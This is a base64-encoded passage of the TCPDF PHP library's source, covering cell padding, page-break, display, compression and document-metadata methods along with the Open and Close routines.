D0gJHRvcDsKCQl9CgkJaWYgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkcmlnaHQpIEFORCAoJHJpZ2h0ID49IDApKSB7CgkJCSR0aGlzLT5jZWxsX21hcmdpblsnUiddID0gJHJpZ2h0OwoJCX0KCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRib3R0b20pIEFORCAoJGJvdHRvbSA+PSAwKSkgewoJCQkkdGhpcy0+Y2VsbF9tYXJnaW5bJ0InXSA9ICRib3R0b207CgkJfQoJfQoKCS8qKgoJICogR2V0IHRoZSBpbnRlcm5hbCBDZWxsIG1hcmdpbiBhcnJheS4KCSAqIEByZXR1cm4gYXJyYXkgb2YgbWFyZ2luIHZhbHVlcwoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOS4wMDAgKDIwMTAtMTAtMDMpCgkgKiBAc2VlIHNldENlbGxNYXJnaW5zKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldENlbGxNYXJnaW5zKCkgewoJCXJldHVybiAkdGhpcy0+Y2VsbF9tYXJnaW47Cgl9CgoJLyoqCgkgKiBBZGp1c3QgdGhlIGludGVybmFsIENlbGwgcGFkZGluZyBhcnJheSB0byB0YWtlIGFjY291bnQgb2YgdGhlIGxpbmUgd2lkdGguCgkgKiBAcGFyYW0gc3RyaW5nfGFycmF5fGludHxib29sICRicmQgSW5kaWNhdGVzIGlmIGJvcmRlcnMgbXVzdCBiZSBkcmF3biBhcm91bmQgdGhlIGNlbGwuIFRoZSB2YWx1ZSBjYW4gYmUgYSBudW1iZXI6PHVsPjxsaT4wOiBubyBib3JkZXIgKGRlZmF1bHQpPC9saT48bGk+MTogZnJhbWU8L2xpPjwvdWw+IG9yIGEgc3RyaW5nIGNvbnRhaW5pbmcgc29tZSBvciBhbGwgb2YgdGhlIGZvbGxvd2luZyBjaGFyYWN0ZXJzIChpbiBhbnkgb3JkZXIpOjx1bD48bGk+TDogbGVmdDwvbGk+PGxpPlQ6IHRvcDwvbGk+PGxpPlI6IHJpZ2h0PC9saT48bGk+QjogYm90dG9tPC9saT48L3VsPiBvciBhbiBhcnJheSBvZiBsaW5lIHN0eWxlcyBmb3IgZWFjaCBib3JkZXIgZ3JvdXAgLSBmb3IgZXhhbXBsZTogYXJyYXkoJ0xUUkInID0+IGFycmF5KCd3aWR0aCcgPT4gMiwgJ2NhcCcgPT4gJ2J1dHQnLCAnam9pbicgPT4gJ21pdGVyJywgJ2Rhc2gnID0+IDAsICdjb2xvcicgPT4gYXJyYXkoMCwgMCwgMCkpKQoJICogQHJldHVybiB2b2lkfGFycmF5IGFycmF5IG9mIGFkanVzdG1lbnRzCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjAwMCAoMjAxMC0xMC0wMykKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIGFkanVzdENlbGxQYWRkaW5nKCRicmQ9MCkgewoJCWlmIChlbXB0eSgkYnJkKSkgewoJCQlyZXR1cm47CgkJfQoJCWlmIChpc19zdHJpbmcoJGJyZCkpIHsKCQkJLy8gY29udmVydCBzdHJpbmcgdG8gYXJyYXkKCQkJJHNsZW4gPSBzdHJsZW4oJGJyZCk7CgkJCSRuZXdicmQgPSBhcnJheSgpOwoJCQlmb3IgKCRpID0gMDsgJGkgPCAkc2xlbjsgKyskaSkgewoJCQkJJG5ld2JyZFskYnJkWyRpXV0gPSB0cnVlOwoJCQl9CgkJCSRicmQgPSAkbmV3YnJkOwoJCX0gZWxzZWlmICgKCQkJKCRicmQgPT09IDEpCgkJCXx8ICgkYnJkID09PSB0cnVlKQoJCQl8fCAoaXNfbnVtZXJpYygkYnJkKSAmJiAoKGludCkkYnJkID4gMCkpCgkJKSB7CgkJCSRicmQgPSBhcnJheSgnTFJUQicgPT4gdHJ1ZSk7CgkJfQoJCWlmICghaXNfYXJyYXkoJGJyZCkpIHsKCQkJcmV0dXJuOwoJCX0KCQkvLyBzdG9yZSBjdXJyZW50IGNlbGwgcGFkZGluZwoJCSRjcCA9ICR0aGlzLT5jZWxsX3BhZGRpbmc7CgkJLy8gc2VsZWN0IGJvcmRlciBtb2RlCgkJaWYgKGlzc2V0KCRicmRbJ21vZGUnXSkpIHsKCQkJJG1vZGUgPSAkYnJkWydtb2RlJ107CgkJCXVuc2V0KCRicmRbJ21vZGUnXSk7CgkJfSBlbHNlIHsKCQkJJG1vZGUgPSAnbm9ybWFsJzsKCQl9CgkJLy8gcHJvY2VzcyBib3JkZXJzCgkJZm9yZWFjaCAoJGJyZCBhcyAkYm9yZGVyID0+ICRzdHlsZSkgewoJCQkkbGluZV93aWR0aCA9ICR0aGlzLT5MaW5lV2lkdGg7CgkJCWlmIChpc19hcnJheSgkc3R5bGUpICYmIGlzc2V0KCRzdHlsZVsnd2lkdGgnXSkpIHsKCQkJCS8vIGdldCBib3JkZXIgd2lkdGgKCQkJCSRsaW5lX3dpZHRoID0gJHN0eWxlWyd3aWR0aCddOwoJCQl9CgkJCSRhZGogPSAwOyAvLyBsaW5lIHdpZHRoIGluc2lkZSB0aGUgY2VsbAoJCQlzd2l0Y2ggKCRtb2RlKSB7CgkJCQljYXNlICdleHQnOiB7CgkJCQkJJGFkaiA9IDA7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQljYXNlICdpbnQnOiB7CgkJCQkJJGFkaiA9ICRsaW5lX3dpZHRoOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnbm9ybWFsJzoKCQkJCWRlZmF1bHQ6IHsKCQkJCQkkYWRqID0gKCRsaW5lX3dpZHRoIC8gMik7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCX0KCQkJLy8gY29ycmVjdCBpbnRlcm5hbCBjZWxsIHBhZGRpbmcgaWYgcmVxdWlyZWQgdG8gYXZvaWQgb3ZlcmxhcCBiZXR3ZWVuIHRleHQgYW5kIGxpbmVzCgkJCWlmICgKCQkJCWlzX251bWVyaWMoJHRoaXMtPmNlbGxfcGFkZGluZ1snVCddKQoJCQkJJiYgKCR0aGlzLT5jZWxsX3BhZGRpbmdbJ1QnXSA8ICRhZGopCgkJCQkmJiAoc3RycG9zKCRib3JkZXIsICdUJykgIT09IGZhbHNlKQoJCQkpIHsKCQkJCSR0aGlzLT5jZWxsX3BhZGRpbmdbJ1QnXSA9ICRhZGo7CgkJCX0KCQkJaWYgKAoJCQkJaXNfbnVtZXJpYygkdGhpcy0+Y2VsbF9wYWRkaW5nWydSJ10pCgkJCQkmJiAoJHRoaXMtPmNlbGxfcGFkZGluZ1snUiddIDwgJGFkaikKCQkJCSYmIChzdHJwb3MoJGJvcmRlciwgJ1InKSAhPT0gZmFsc2UpCgkJCSkgewoJCQkJJHRoaXMtPmNlbGxfcGFkZGluZ1snUiddID0gJGFkajsKCQkJfQoJCQlpZiAoCgkJCQlpc19udW1lcmljKCR0aGlzLT5jZWxsX3BhZGRpbmdbJ0InXSkKCQkJCSYmICgkdGhpcy0+Y2VsbF9wYWRkaW5nWydCJ10gPCAkYWRqKQoJCQkJJiYgKHN0cnBvcygkYm9yZGVyLCAnQicpICE9PSBmYWxzZSkKCQkJKSB7CgkJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nWydCJ10gPSAkYWRqOwoJCQl9CgkJCWlmICgKCQkJCWlzX251bWVyaWMoJHRoaXMtPmNlbGxfcGFkZGluZ1snTCddKQoJCQkJJiYgKCR0aGlzLT5jZWxsX3BhZGRpbmdbJ0wnXSA8ICRhZGopCgkJCQkmJiAoc3RycG9zKCRib3JkZXIsICdMJykgIT09IGZhbHNlKQoJCQkpIHsKCQkJCSR0aGlzLT5jZWxsX3BhZGRpbmdbJ0wnXSA9ICRhZGo7CgkJCX0KCgkJfQoKCQlyZXR1cm4gYXJyYXkoCgkJCSdUJyA9PiAoJHRoaXMtPmNlbGxfcGFkZGluZ1snVCddIC0gJGNwWydUJ10pLAoJCQknUicgPT4gKCR0aGlzLT5jZWxsX3BhZGRpbmdbJ1InXSAtICRjcFsnUiddKSwKCQkJJ0InID0+ICgkdGhpcy0+Y2VsbF9wYWRkaW5nWydCJ10gLSAkY3BbJ0InXSksCgkJCSdMJyA9PiAoJHRoaXMtPmNlbGxfcGFkZGluZ1snTCddIC0gJGNwWydMJ10pLAoJCSk7Cgl9CgoJLyoqCgkgKiBFbmFibGVzIG9yIGRpc2FibGVzIHRoZSBhdXRvbWF0aWMgcGFnZSBicmVha2luZyBtb2RlLiBXaGVuIGVuYWJsaW5nLCB0aGUgc2Vjb25kIHBhcmFtZXRlciBpcyB0aGUgZGlzdGFuY2UgZnJvbSB0aGUgYm90dG9tIG9mIHRoZSBwYWdlIHRoYXQgZGVmaW5lcyB0aGUgdHJpZ2dlcmluZyBsaW1pdC4gQnkgZGVmYXVsdCwgdGhlIG1vZGUgaXMgb24gYW5kIHRoZSBtYXJnaW4gaXMgMiBjbS4KCSAqIEBwYXJhbSBib29sZWFuICRhdXRvIEJvb2xlYW4gaW5kaWNhdGluZyBpZiBtb2RlIHNob3VsZCBiZSBvbiBvciBvZmYuCgkgKiBAcGFyYW0gZmxvYXQgJG1hcmdpbiBEaXN0YW5jZSBmcm9tIHRoZSBib3R0b20gb2YgdGhlIHBhZ2UuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS4wCgkgKiBAc2VlIENlbGwoKSwgTXVsdGlDZWxsKCksIEFjY2VwdFBhZ2VCcmVhaygpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRBdXRvUGFnZUJyZWFrKCRhdXRvLCAkbWFyZ2luPTApIHsKCQkkdGhpcy0+QXV0b1BhZ2VCcmVhayA9ICRhdXRvID8gdHJ1ZSA6IGZhbHNlOwoJCSR0aGlzLT5iTWFyZ2luID0gJG1hcmdpbjsKCQkkdGhpcy0+UGFnZUJyZWFrVHJpZ2dlciA9ICR0aGlzLT5oIC0gJG1hcmdpbjsKCX0KCgkvKioKCSAqIFJldHVybiB0aGUgYXV0by1wYWdlLWJyZWFrIG1vZGUgKHRydWUgb3IgZmFsc2UpLgoJICogQHJldHVybiBib29sIGF1dG8tcGFnZS1icmVhayBtb2RlCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjA4OAoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0QXV0b1BhZ2VCcmVhaygpIHsKCQlyZXR1cm4gJHRoaXMtPkF1dG9QYWdlQnJlYWs7Cgl9CgoJLyoqCgkgKiBEZWZpbmVzIHRoZSB3YXkgdGhlIGRvY3VtZW50IGlzIHRvIGJlIGRpc3BsYXllZCBieSB0aGUgdmlld2VyLgoJICogQHBhcmFtIG1peGVkICR6b29tIFRoZSB6b29tIHRvIHVzZS4gSXQgY2FuIGJlIG9uZSBvZiB0aGUgZm9sbG93aW5nIHN0cmluZyB2YWx1ZXMgb3IgYSBudW1iZXIgaW5kaWNhdGluZyB0aGUgem9vbWluZyBmYWN0b3IgdG8gdXNlLiA8dWw+PGxpPmZ1bGxwYWdlOiBkaXNwbGF5cyB0aGUgZW50aXJlIHBhZ2Ugb24gc2NyZWVuIDwvbGk+PGxpPmZ1bGx3aWR0aDogdXNlcyBtYXhpbXVtIHdpZHRoIG9mIHdpbmRvdzwvbGk+PGxpPnJlYWw6IHVzZXMgcmVhbCBzaXplIChlcXVpdmFsZW50IHRvIDEwMCUgem9vbSk8L2xpPjxsaT5kZWZhdWx0OiB1c2VzIHZpZXdlciBkZWZhdWx0IG1vZGU8L2xpPjwvdWw+CgkgKiBAcGFyYW0gc3RyaW5nICRsYXlvdXQgVGhlIHBhZ2UgbGF5b3V0LiBQb3NzaWJsZSB2YWx1ZXMgYXJlOjx1bD48bGk+U2luZ2xlUGFnZSBEaXNwbGF5IG9uZSBwYWdlIGF0IGEgdGltZTwvbGk+PGxpPk9uZUNvbHVtbiBEaXNwbGF5IHRoZSBwYWdlcyBpbiBvbmUgY29sdW1uPC9saT48bGk+VHdvQ29sdW1uTGVmdCBEaXNwbGF5IHRoZSBwYWdlcyBpbiB0d28gY29sdW1ucywgd2l0aCBvZGQtbnVtYmVyZWQgcGFnZXMgb24gdGhlIGxlZnQ8L2xpPjxsaT5Ud29Db2x1bW5SaWdodCBEaXNwbGF5IHRoZSBwYWdlcyBpbiB0d28gY29sdW1ucywgd2l0aCBvZGQtbnVtYmVyZWQgcGFnZXMgb24gdGhlIHJpZ2h0PC9saT48bGk+VHdvUGFnZUxlZnQgKFBERiAxLjUpIERpc3BsYXkgdGhlIHBhZ2VzIHR3byBhdCBhIHRpbWUsIHdpdGggb2RkLW51bWJlcmVkIHBhZ2VzIG9uIHRoZSBsZWZ0PC9saT48bGk+VHdvUGFnZVJpZ2h0IChQREYgMS41KSBEaXNwbGF5IHRoZSBwYWdlcyB0d28gYXQgYSB0aW1lLCB3aXRoIG9kZC1udW1iZXJlZCBwYWdlcyBvbiB0aGUgcmlnaHQ8L2xpPjwvdWw+CgkgKiBAcGFyYW0gc3RyaW5nICRtb2RlIEEgbmFtZSBvYmplY3Qgc3BlY2lmeWluZyBob3cgdGhlIGRvY3VtZW50IHNob3VsZCBiZSBkaXNwbGF5ZWQgd2hlbiBvcGVuZWQ6PHVsPjxsaT5Vc2VOb25lIE5laXRoZXIgZG9jdW1lbnQgb3V0bGluZSBub3IgdGh1bWJuYWlsIGltYWdlcyB2aXNpYmxlPC9saT48bGk+VXNlT3V0bGluZXMgRG9jdW1lbnQgb3V0bGluZSB2aXNpYmxlPC9saT48bGk+VXNlVGh1bWJzIFRodW1ibmFpbCBpbWFnZXMgdmlzaWJsZTwvbGk+PGxpPkZ1bGxTY3JlZW4gRnVsbC1zY3JlZW4gbW9kZSwgd2l0aCBubyBtZW51IGJhciwgd2luZG93IGNvbnRyb2xzLCBvciBhbnkgb3RoZXIgd2luZG93IHZpc2libGU8L2xpPjxsaT5Vc2VPQyAoUERGIDEuNSkgT3B0aW9uYWwgY29udGVudCBncm91cCBwYW5lbCB2aXNpYmxlPC9saT48bGk+VXNlQXR0YWNobWVudHMgKFBERiAxLjYpIEF0dGFjaG1lbnRzIHBhbmVsIHZpc2libGU8L2xpPjwvdWw+CgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS4yCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXREaXNwbGF5TW9kZSgkem9vbSwgJGxheW91dD0nU2luZ2xlUGFnZScsICRtb2RlPSdVc2VOb25lJykgewoJCWlmICgoJHpvb20gPT0gJ2Z1bGxwYWdlJykgT1IgKCR6b29tID09ICdmdWxsd2lkdGgnKSBPUiAoJHpvb20gPT0gJ3JlYWwnKSBPUiAoJHpvb20gPT0gJ2RlZmF1bHQnKSBPUiAoIWlzX3N0cmluZygkem9vbSkpKSB7CgkJCSR0aGlzLT5ab29tTW9kZSA9ICR6b29tOwoJCX0gZWxzZSB7CgkJCSR0aGlzLT5FcnJvcignSW5jb3JyZWN0IHpvb20gZGlzcGxheSBtb2RlOiAnLiR6b29tKTsKCQl9CgkJJHRoaXMtPkxheW91dE1vZGUgPSBUQ1BERl9TVEFUSUM6OmdldFBhZ2VMYXlvdXRNb2RlKCRsYXlvdXQpOwoJCSR0aGlzLT5QYWdlTW9kZSA9IFRDUERGX1NUQVRJQzo6Z2V0UGFnZU1vZGUoJG1vZGUpOwoJfQoKCS8qKgoJICogQWN0aXZhdGVzIG9yIGRlYWN0aXZhdGVzIHBhZ2UgY29tcHJlc3Npb24uIFdoZW4gYWN0aXZhdGVkLCB0aGUgaW50ZXJuYWwgcmVwcmVzZW50YXRpb24gb2YgZWFjaCBwYWdlIGlzIGNvbXByZXNzZWQsIHdoaWNoIGxlYWRzIHRvIGEgY29tcHJlc3Npb24gcmF0aW8gb2YgYWJvdXQgMiBmb3IgdGhlIHJlc3VsdGluZyBkb2N1bWVudC4gQ29tcHJlc3Npb24gaXMgb24gYnkgZGVmYXVsdC4KCSAqIE5vdGU6IHRoZSBabGliIGV4dGVuc2lvbiBpcyByZXF1aXJlZCBmb3IgdGhpcyBmZWF0dXJlLiBJZiBub3QgcHJlc2VudCwgY29tcHJlc3Npb24gd2lsbCBiZSB0dXJuZWQgb2ZmLgoJICogQHBhcmFtIGJvb2xlYW4gJGNvbXByZXNzIEJvb2xlYW4gaW5kaWNhdGluZyBpZiBjb21wcmVzc2lvbiBtdXN0IGJlIGVuYWJsZWQuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS40CgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRDb21wcmVzc2lvbigkY29tcHJlc3M9dHJ1ZSkgewoJCSR0aGlzLT5jb21wcmVzcyA9IGZhbHNlOwoJCWlmIChmdW5jdGlvbl9leGlzdHMoJ2d6Y29tcHJlc3MnKSkgewoJCQlpZiAoJGNvbXByZXNzKSB7CgkJCQlpZiAoICEkdGhpcy0+cGRmYV9tb2RlKSB7CgkJCQkJJHRoaXMtPmNvbXByZXNzID0gdHJ1ZTsKCQkJCX0KCQkJfQoJCX0KCX0KCgkvKioKCSAqIFNldCBmbGFnIHRvIGZvcmNlIHNSR0JfSUVDNjE5NjYtMi4xIGJsYWNrIHNjYWxlZCBJQ0MgY29sb3IgcHJvZmlsZSBmb3IgdGhlIHdob2xlIGRvY3VtZW50LgoJICogQHBhcmFtIGJvb2xlYW4gJG1vZGUgSWYgdHJ1ZSBmb3JjZSBzUkdCIG91dHB1dCBpbnRlbnQuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjEyMSAoMjAxMS0wOS0yOCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldFNSR0Jtb2RlKCRtb2RlPWZhbHNlKSB7CgkJJHRoaXMtPmZvcmNlX3NyZ2IgPSAkbW9kZSA/IHRydWUgOiBmYWxzZTsKCX0KCgkvKioKCSAqIFR1cm4gb24vb2ZmIFVuaWNvZGUgbW9kZSBmb3IgZG9jdW1lbnQgaW5mb3JtYXRpb24gZGljdGlvbmFyeSAobWV0YSB0YWdzKS4KCSAqIFRoaXMgaGFzIGVmZmVjdCBvbmx5IHdoZW4gdW5pY29kZSBtb2RlIGlzIHNldCB0byBmYWxzZS4KCSAqIEBwYXJhbSBib29sZWFuICR1bmljb2RlIGlmIHRydWUgc2V0IHRoZSBtZXRhIGluZm9ybWF0aW9uIGluIFVuaWNvZGUKCSAqIEBzaW5jZSA1LjkuMDI3ICgyMDEwLTEyLTAxKQoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0RG9jSW5mb1VuaWNvZGUoJHVuaWNvZGU9dHJ1ZSkgewoJCSR0aGlzLT5kb2NpbmZvdW5pY29kZSA9ICR1bmljb2RlID8gdHJ1ZSA6IGZhbHNlOwoJfQoKCS8qKgoJICogRGVmaW5lcyB0aGUgdGl0bGUgb2YgdGhlIGRvY3VtZW50LgoJICogQHBhcmFtIHN0cmluZyAkdGl0bGUgVGhlIHRpdGxlLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDEuMgoJICogQHNlZSBTZXRBdXRob3IoKSwgU2V0Q3JlYXRvcigpLCBTZXRLZXl3b3JkcygpLCBTZXRTdWJqZWN0KCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldFRpdGxlKCR0aXRsZSkgewoJCSR0aGlzLT50aXRsZSA9ICR0aXRsZTsKCX0KCgkvKioKCSAqIERlZmluZXMgdGhlIHN1YmplY3Qgb2YgdGhlIGRvY3VtZW50LgoJICogQHBhcmFtIHN0cmluZyAkc3ViamVjdCBUaGUgc3ViamVjdC4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjIKCSAqIEBzZWUgU2V0QXV0aG9yKCksIFNldENyZWF0b3IoKSwgU2V0S2V5d29yZHMoKSwgU2V0VGl0bGUoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0U3ViamVjdCgkc3ViamVjdCkgewoJCSR0aGlzLT5zdWJqZWN0ID0gJHN1YmplY3Q7Cgl9CgoJLyoqCgkgKiBEZWZpbmVzIHRoZSBhdXRob3Igb2YgdGhlIGRvY3VtZW50LgoJICogQHBhcmFtIHN0cmluZyAkYXV0aG9yIFRoZSBuYW1lIG9mIHRoZSBhdXRob3IuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS4yCgkgKiBAc2VlIFNldENyZWF0b3IoKSwgU2V0S2V5d29yZHMoKSwgU2V0U3ViamVjdCgpLCBTZXRUaXRsZSgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRBdXRob3IoJGF1dGhvcikgewoJCSR0aGlzLT5hdXRob3IgPSAkYXV0aG9yOwoJfQoKCS8qKgoJICogQXNzb2NpYXRlcyBrZXl3b3JkcyB3aXRoIHRoZSBkb2N1bWVudCwgZ2VuZXJhbGx5IGluIHRoZSBmb3JtICdrZXl3b3JkMSBrZXl3b3JkMiAuLi4nLgoJICogQHBhcmFtIHN0cmluZyAka2V5d29yZHMgVGhlIGxpc3Qgb2Yga2V5d29yZHMuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS4yCgkgKiBAc2VlIFNldEF1dGhvcigpLCBTZXRDcmVhdG9yKCksIFNldFN1YmplY3QoKSwgU2V0VGl0bGUoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0S2V5d29yZHMoJGtleXdvcmRzKSB7CgkJJHRoaXMtPmtleXdvcmRzID0gJGtleXdvcmRzOwoJfQoKCS8qKgoJICogRGVmaW5lcyB0aGUgY3JlYXRvciBvZiB0aGUgZG9jdW1lbnQuIFRoaXMgaXMgdHlwaWNhbGx5IHRoZSBuYW1lIG9mIHRoZSBhcHBsaWNhdGlvbiB0aGF0IGdlbmVyYXRlcyB0aGUgUERGLgoJICogQHBhcmFtIHN0cmluZyAkY3JlYXRvciBUaGUgbmFtZSBvZiB0aGUgY3JlYXRvci4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjIKCSAqIEBzZWUgU2V0QXV0aG9yKCksIFNldEtleXdvcmRzKCksIFNldFN1YmplY3QoKSwgU2V0VGl0bGUoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0Q3JlYXRvcigkY3JlYXRvcikgewoJCSR0aGlzLT5jcmVhdG9yID0gJGNyZWF0b3I7Cgl9CgoJLyoqCgkgKiBXaGV0aGVyIHRvIGFsbG93IGxvY2FsIGZpbGUgcGF0aCBpbiBpbWFnZSBodG1sIHRhZ3MsIHdoZW4gcHJlZml4ZWQgd2l0aCBmaWxlOi8vCgkgKgoJICogQHBhcmFtIGJvb2wgJGFsbG93TG9jYWxGaWxlcyB0cnVlLCB3aGVuIGxvY2FsIGZpbGVzIHNob3VsZCBiZSBhbGxvd2VkLiBPdGhlcndpc2UgZmFsc2UuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNi40CgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRBbGxvd0xvY2FsRmlsZXMoJGFsbG93TG9jYWxGaWxlcykgewoJCSR0aGlzLT5hbGxvd0xvY2FsRmlsZXMgPSAoYm9vbCkgJGFsbG93TG9jYWxGaWxlczsKCX0KCgoJLyoqCgkgKiBUaHJvdyBhbiBleGNlcHRpb24gb3IgcHJpbnQgYW4gZXJyb3IgbWVzc2FnZSBhbmQgZGllIGlmIHRoZSBLX1RDUERGX1BBUlNFUl9USFJPV19FWENFUFRJT05fRVJST1IgY29uc3RhbnQgaXMgc2V0IHRvIHRydWUuCgkgKiBAcGFyYW0gc3RyaW5nICRtc2cgVGhlIGVycm9yIG1lc3NhZ2UKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjAKCSAqLwoJcHVibGljIGZ1bmN0aW9uIEVycm9yKCRtc2cpIHsKCQkvLyB1bnNldCBhbGwgY2xhc3MgdmFyaWFibGVzCgkJJHRoaXMtPl9kZXN0cm95KHRydWUpOwoJCSRtc2cgPSBodG1sc3BlY2lhbGNoYXJzKCRtc2csIEVOVF9RVU9URVMsICdVVEYtOCcpOwoJCWlmIChkZWZpbmVkKCdLX1RDUERGX1RIUk9XX0VYQ0VQVElPTl9FUlJPUicpIEFORCAhS19UQ1BERl9USFJPV19FWENFUFRJT05fRVJST1IpIHsKCQkJZGllKCc8c3Ryb25nPlRDUERGIEVSUk9SOiA8L3N0cm9uZz4nLiRtc2cpOwoJCX0gZWxzZSB7CgkJCXRocm93IG5ldyBFeGNlcHRpb24oJ1RDUERGIEVSUk9SOiAnLiRtc2cpOwoJCX0KCX0KCgkvKioKCSAqIFRoaXMgbWV0aG9kIGJlZ2lucyB0aGUgZ2VuZXJhdGlvbiBvZiB0aGUgUERGIGRvY3VtZW50LgoJICogSXQgaXMgbm90IG5lY2Vzc2FyeSB0byBjYWxsIGl0IGV4cGxpY2l0bHkgYmVjYXVzZSBBZGRQYWdlKCkgZG9lcyBpdCBhdXRvbWF0aWNhbGx5LgoJICogTm90ZTogbm8gcGFnZSBpcyBjcmVhdGVkIGJ5IHRoaXMgbWV0aG9kCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS4wCgkgKiBAc2VlIEFkZFBhZ2UoKSwgQ2xvc2UoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gT3BlbigpIHsKCQkkdGhpcy0+c3RhdGUgPSAxOwoJfQoKCS8qKgoJICogVGVybWluYXRlcyB0aGUgUERGIGRvY3VtZW50LgoJICogSXQgaXMgbm90IG5lY2Vzc2FyeSB0byBjYWxsIHRoaXMgbWV0aG9kIGV4cGxpY2l0bHkgYmVjYXVzZSBPdXRwdXQoKSBkb2VzIGl0IGF1dG9tYXRpY2FsbHkuCgkgKiBJZiB0aGUgZG9jdW1lbnQgY29udGFpbnMgbm8gcGFnZSwgQWRkUGFnZSgpIGlzIGNhbGxlZCB0byBwcmV2ZW50IGZyb20gZ2V0dGluZyBhbiBpbnZhbGlkIGRvY3VtZW50LgoJICogQHB1YmxpYwoJICogQHNpbmNlIDEuMAoJICogQHNlZSBPcGVuKCksIE91dHB1dCgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBDbG9zZSgpIHsKCQlpZiAoJHRoaXMtPnN0YXRlID09IDMpIHsKCQkJcmV0dXJuOwoJCX0KCQlpZiAoJHRoaXMtPnBhZ2UgPT0gMCkgewoJCQkkdGhpcy0+QWRkUGFnZSgpOwoJCX0KCQkkdGhpcy0+ZW5kTGF5ZXIoKTsKCQlpZiAoJHRoaXMtPnRjcGRmbGluaykgewoJCQkvLyBzYXZlIGN1cnJlbnQgZ3JhcGhpYyBzZXR0aW5ncwoJCQkkZ3ZhcnMgPSAkdGhpcy0+Z2V0R3JhcGhpY1ZhcnMoKTsKCQkJJHRoaXMtPnNldEVxdWFsQ29sdW1ucygpOwoJCQkkdGhpcy0+bGFzdHBhZ2UodHJ1ZSk7CgkJCSR0aGlzLT5zZXRBdXRvUGFnZUJyZWFrKGZhbHNlKTsKCQkJJHRoaXMtPnggPSAwOwoJCQkkdGhpcy0+eSA9ICR0aGlzLT5oIC0gKDEgLyAkdGhpcy0+ayk7CgkJCSR0aGlzLT5sTWFyZ2luID0gMDsKCQkJJHRoaXMtPl9vdXRTYXZlR3JhcGhpY3NTdGF0ZSgpOwoJCQkkZm9udCA9IGRlZmluZWQoJ1BERl9GT05UX05BTUVfTUFJTicpP1BERl9GT05UX05BTUVfTUFJTjonaGVsdmV0aWNhJzsKCQkJJHRoaXMtPnNldEZvbnQoJGZvbnQsICcnLCAxKTsKCQkJJHRoaXMtPnNldFRleHRSZW5kZXJpbmdNb2RlKDAsIGZhbHNlLCBmYWxzZSk7CgkJCSRtc2cgPSAiXHg1MFx4NmZceDc3XHg2NVx4NzJceDY1XHg2NFx4MjBceDYyXHg3OVx4MjBceDU0XHg0M1x4NTBceDQ0XHg0Nlx4MjBceDI4XHg3N1x4NzdceDc3XHgyZVx4NzRceDYzXHg3MFx4NjRceDY2XHgyZVx4NmZceDcyXHg2N1x4MjkiOwoJCQkkbG5rID0gIlx4NjhceDc0XHg3NFx4NzBceDNhXHgyZlx4MmZceDc3XHg3N1x4NzdceDJlXHg3NFx4NjNceDcwXHg2NFx4NjZceDJlXHg2Zlx4NzJceDY3IjsKCQkJJHRoaXMtPkNlbGwoMCwgMCwgJG1zZywgMCwgMCwgJ0wnLCAwLCAkbG5rLCAwLCBmYWxzZSwgJ0QnLCAnQicpOwoJCQkkdGhpcy0+X291dFJlc3RvcmVHcmFwaGljc1N0YXRlKCk7CgkJCS8vIHJlc3RvcmUgZ3JhcGhpYyBzZXR0aW5ncwoJCQkkdGhpcy0+c2V0R3JhcGhpY1ZhcnMoJGd2YXJzKTsKCQl9CgkJLy8gY2xvc2UgcGFnZQoJCSR0aGlzLT5lbmRQYWdlKCk7CgkJLy8gY2xvc2UgZG9jdW1lbnQKCQkkdGhpcy0+X2VuZGRvYygpOwoJCS8vIHVuc2V0IGFsbCBjbGFzcyB2YXJpYWJsZXMgKGV4Y2VwdCBjcml0aWNhbCBvbmVzKQoJCSR0aGlzLT5fZGVzdHJveShmYWxzZSk7Cgl9CgoJLyoqCgkgKiBNb3ZlIHBvaW50ZXIgYXQgdGhlIHNwZWNpZmllZCBkb2N1bWVudCBwYWdlIGFuZCB1cGRhdGUgcGFnZSBkaW1lbnNpb25zLgoJICogQHBhcmFtIGludCAkcG51bSBwYWdlIG51bWJlciAoMSAuLi4gbnVtcGFnZXMpCgkgKiBAcGFyYW0gYm9vbGVhbiAkcmVzZXRtYXJnaW5zIGlmIHRydWUgcmVzZXQgbGVmdCwgcmlnaHQsIHRvcCBtYXJnaW5zIGFuZCBZIHBvc2l0aW9uLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDcpCgkgKiBAc2VlIGdldFBhZ2UoKSwgbGFzdHBhZ2UoKSw